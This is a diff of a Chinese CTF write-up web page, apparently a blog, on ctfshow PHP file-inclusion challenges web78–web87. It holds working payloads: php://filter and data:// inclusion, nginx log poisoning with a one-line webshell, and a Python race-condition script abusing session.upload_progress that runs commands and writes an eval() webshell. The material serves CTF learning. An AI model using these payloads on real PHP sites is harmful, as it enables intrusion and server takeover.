@@ -56,14 +56,17 @@ IconifyProviders = {
 </blockquote>
 <h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>签到</p>
 <p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
-<h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>); </span><br></pre></td></tr></table></figure>
+<h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file); </code></pre>
 
 <p>将php过滤，可以考虑data</p>
 <p>Payload:</p>
 <blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line"></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;
+
+PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt; &lt;?php system(&#39;cat flag.php&#39;);</code></pre>
 </blockquote>
-<h4 id="web80-nginx日志注入"><a href="#web80-nginx日志注入" class="headerlink" title="web80(nginx日志注入)"></a>web80(nginx日志注入)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>); </span><br></pre></td></tr></table></figure>
+<h4 id="web80-nginx日志注入"><a href="#web80-nginx日志注入" class="headerlink" title="web80(nginx日志注入)"></a>web80(nginx日志注入)</h4><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+$file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file); </code></pre>
 
 <p>data也被ban了</p>
 <p>使用nginx日志文件包含，在User-Agent写入一句话木马，使用蚁剑连接<a target="_blank" rel="noopener" href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p>
@@ -75,7 +78,16 @@ IconifyProviders = {
 <p>看题解也可以大小写绕过用PHP:&#x2F;&#x2F;input</p>
 <h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>多过滤了冒号，所以依旧可以nginx日志注入</p>
 <h4 id="web82-利用session-upload-progress进行文件包含"><a href="#web82-利用session-upload-progress进行文件包含" class="headerlink" title="web82(利用session.upload_progress进行文件包含)"></a>web82(利用session.upload_progress进行文件包含)</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;
+    $file &#x3D; $_GET[&#39;file&#39;];
+    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);
+    include($file);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
 
 <p>如果session.auto_start&#x3D;On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
 <p>但是问题来了，默认配置session.upload_progress.cleanup &#x3D; on导致文件上传后，session文件内容立即清空，</p>
@@ -84,7 +96,17 @@ IconifyProviders = {
 <p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p>
 <p><strong>方法一:</strong></p>
 <p>先以POST的形式发包，上传的文件随意,下面是构造的上传表单</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;
+    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;
+    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;
+    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;
+&lt;&#x2F;form&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;
+</code></pre>
 
 <p>使用burp进行爆破（两个要同时爆破）</p>
 <p><img src="web82.png" loading="lazy"></p>
@@ -92,7 +114,42 @@ IconifyProviders = {
 <p>最后竞争得到flag</p>
 <p><strong>方法二</strong>:</p>
 <p>可以利用脚本进行条件竞争</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="language-python" data-language="python"><code class="language-python">import io
+import sys
+import requests
+import threading
+
+sessid &#x3D; &#39;Qftm&#39;
+url &#x3D; &#39;https:&#x2F;&#x2F;2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show&#x2F;&#39;
+
+def POST(session):
+    while True:
+        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)
+        session.post(
+            url,
+            data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#39;cat *&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[mtfQ])?&gt;&#39;);?&gt;&quot;&#125;,
+            files&#x3D;&#123;&quot;file&quot;:(&#39;q.txt&#39;, f)&#125;,
+            cookies&#x3D;&#123;&#39;PHPSESSID&#39;:sessid&#125;
+        )
+
+def READ(session):
+    while True:
+        response &#x3D; session.get(f&#39;&#123;url&#125;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;sessid&#125;&#39;)
+        if &#39;flag&#39; not in response.text:
+            print(&#39;[+++]retry&#39;)
+        else:
+            print(response.text)
+            sys.exit(0)
+
+
+with requests.session() as session:
+    t1 &#x3D; threading.Thread(target&#x3D;POST, args&#x3D;(session, ))
+    t1.daemon &#x3D; True
+    t1.start()
+
+    READ(session)
+
+</code></pre>
 
 <h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>条件竞争同上</p>
 <h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>添加了如下代码</p>
@@ -100,7 +157,16 @@ IconifyProviders = {
 <p>&#x2F;&#x2F; 在 rm -rf &#x2F;tmp&#x2F;* 执行之后立刻有新的请求创建了 sess_shell 文件 条件竞争依然有效</p>
 <h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>添加了一个内容识别，如果有<code>&lt;</code>就die，依旧可以竞争。</p>
 <h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。<br>include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。<br>脚本里用的是完整路径，不影响竞争。</p>
-<h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">
+if(isset($_GET[&#39;file&#39;]))&#123;
+    $file &#x3D; $_GET[&#39;file&#39;];
+    $content &#x3D; $_POST[&#39;content&#39;];
+    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
+    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);
+    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);
+&#125;</code></pre>
 
 <p>file_put_contents() 函数把一个字符串写入文件中。</p>
 <p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() 函数</a></p>
@@ -108,7 +174,29 @@ IconifyProviders = {
 <p>参考大佬文章，可以使用base64或者rot13来进行对前面代码进行杂糅</p>
 <p>首先构造$file，因为要对file进行一次url解码所以我们对payload进行两次url编码</p>
 <p>晚上大多工具是对英文字符不进行url编码的，所以这里给出脚本方便进行urlencode</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_char</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="comment"># 指定字符集，转换为ASCII码后，再转换为16进制，并添加%</span></span><br><span class="line">    special_chars = <span class="string">&quot;!#$&amp;&#x27;()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    <span class="keyword">if</span> char <span class="keyword">in</span> special_chars:</span><br><span class="line">        <span class="comment"># 转换为ASCII码，然后转换为16进制，并添加%</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(char))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 对其他字符进行URL编码</span></span><br><span class="line">        <span class="keyword">return</span> urllib.parse.quote(char)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 对字符串中的每个字符进行编码</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(encode_char(char) <span class="keyword">for</span> char <span class="keyword">in</span> input_string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_string = <span class="string">&quot;Test&quot;</span></span><br><span class="line">encoded_string = url_encode(input_string)</span><br><span class="line"><span class="built_in">print</span>(encoded_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="language-python" data-language="python"><code class="language-python">import urllib.parse
+
+
+def encode_char(char):
+    # 指定字符集，转换为ASCII码后，再转换为16进制，并添加%
+    special_chars &#x3D; &quot;!#$&amp;&#39;()*+,&#x2F;:;&#x3D;?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+    if char in special_chars:
+        # 转换为ASCII码，然后转换为16进制，并添加%
+        return &#39;%&#123;:02x&#125;&#39;.format(ord(char))
+    else:
+        # 对其他字符进行URL编码
+        return urllib.parse.quote(char)
+
+
+def url_encode(input_string):
+    # 对字符串中的每个字符进行编码
+    return &#39;&#39;.join(encode_char(char) for char in input_string)
+
+
+input_string &#x3D; &quot;Test&quot;
+encoded_string &#x3D; url_encode(input_string)
+print(encoded_string)
+</code></pre>
 
 <blockquote>
 <p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p>
